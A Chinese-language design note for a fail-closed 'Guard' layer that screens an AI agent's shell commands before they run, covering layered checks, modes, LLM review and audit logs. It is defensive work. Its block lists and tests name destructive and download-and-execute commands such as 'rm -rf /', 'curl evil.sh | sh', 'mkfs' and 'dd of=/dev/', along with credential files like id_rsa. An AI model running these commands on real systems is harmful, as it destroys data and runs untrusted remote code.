# 安全 Guard 实现

> 参考 Suna 的 `internal/guard`，为 `run_command` 等工具加安全审查层。
> 这是"成品 agent 最不能缺的一层"——`run_command` 能执行任意 shell 命令，太危险。

---

## 一、为什么需要 Guard

`run_command` 工具能执行任意 shell 命令，这是 agent 最强大的能力，也是最危险的权力来源。
如果模型被诱导执行 `rm -rf /`、`curl evil.sh | sh`，后果不堪设想。

**没有 Guard 时**：模型说调什么命令就执行什么命令，完全裸奔。

**有 Guard 后**：每次工具调用先过安全检查，危险操作被拦截，风险操作询问用户。

---

## 二、参考 Suna 的架构

Suna 的 Guard 是分层检查 + 模式策略 + 审计：

```
结构性高危 → 危险命令规则 → workspace边界 → 敏感文件 → 白名单 → 只读判定 → 模式策略 → smart模式LLM审查
```

我实现的 Python 版（`myagent/guard.py`）保留了核心分层：

```
结构性高危 → 危险命令规则 → 敏感文件 → 只读判定 → 模式策略 → smart模式LLM审查
```

（省略了 workspace 边界，因为你的项目还没定义 workspace 概念，后续可加。）

---

## 三、四种模式（mode）

| 模式 | 行为 | 适用 |
|------|------|------|
| `readonly` | 只允许只读操作，其余拒绝 | 只读排查 |
| `ask` | 风险操作询问用户确认 | 交互式使用 |
| `auto` | 自动放行（仍拦截高危/危险/敏感） | 信任场景 |
| `smart` | 用 LLM 审查 exec 命令（推荐） | 默认 |

配置方式（`.env`）：
```bash
MY_AGENT_GUARD_MODE=smart
```

---

## 四、分层检查逻辑

按顺序硬拦截，命中即返回决策：

### 1. 结构性高危（所有模式一致拦截）
识别高危**组合特征**，不依赖规则穷举：
- `rm -rf /`、`rm -rf ~`（递归删除根/家目录）
- `dd of=/dev/`、`mkfs`（磁盘操作）
- `chmod -R 777 /`（权限变更）
- `curl x | sh`（下载→执行链）
- `$(rm -rf /)`（动态表达式高危）

### 2. 危险命令规则（正则黑名单）
参考 Suna `rules_unix.go`，用正则匹配危险命令。

### 3. 敏感文件
参考 Suna `sensitive.go`，`.env`、`.pem`、`.key`、`id_rsa`、`.ssh/` 等一律拒绝读写。

### 4. 只读判定
静态判定命令是否可证明无副作用。**无法证明只读 → 非只读**，绝不猜测放行。
只放行简单只读白名单（`ls`/`cat`/`date`/`pwd` 等），且不含写重定向、管道到执行器、动态表达式。

### 5. 模式策略
根据 mode 处置非只读操作。

### 6. smart 模式 LLM 审查
对 exec 命令用 LLM 审查，**审风险不审意图**。LLM 不可用时 fail-closed（拒绝）。

---

## 五、安全底线（fail-closed）

- **无法证明只读 → 一律非只读**，交给模式策略处置，绝不猜测放行。
- **LLM 审查不可用时 → 拒绝**，不放行。

---

## 六、审计

每次决策都记录到日志（JSONL），可追溯：
```bash
MY_AGENT_GUARD_AUDIT=guard_audit.log
```

日志示例：
```json
{"ts": 1788909583.1, "tool": "run_command", "params": {"command": "date"}, "decision": "approve", "reason": "readonly call"}
{"ts": 1788909583.1, "tool": "run_command", "params": {"command": "rm -rf /"}, "decision": "reject", "reason": "structural_high_risk"}
```

---

## 七、代码结构

```
myagent/
├── guard.py        # Guard 类：分层检查 + 模式策略 + 审计 + LLM审查
├── runner.py       # 集成：_dispatch 里先过 Guard 再执行工具
├── agent.py        # 创建 Guard，注入 LLM 审查器
├── cli.py          # 提供 confirm_callback（ask 模式询问用户）
└── config.py       # guard_mode / guard_audit_path 配置
```

---

## 八、验证结果

| 测试 | 结果 |
|------|------|
| `date` / `ls` / `cat`（只读） | ✅ approve |
| `rm -rf /` / `rm -rf ~` | ✅ reject（结构性高危） |
| `mkfs` / `dd of=/dev/` | ✅ reject |
| `curl x \| sh` / `eval $(...)` | ✅ reject |
| 读 `.env` / `id_rsa`（敏感文件） | ✅ reject |
| `mkdir`（smart 模式） | ✅ LLM 审查 approve |
| ask 模式风险操作 | ✅ confirm |
| readonly 模式写操作 | ✅ reject |
| 审计日志 | ✅ 记录 |

---

## 九、一句话总结

**Guard 是工具执行前的安全闸门：分层硬拦截危险操作，模式策略处置风险操作，
LLM 审查 exec 命令，全程审计留痕，fail-closed 兜底。**
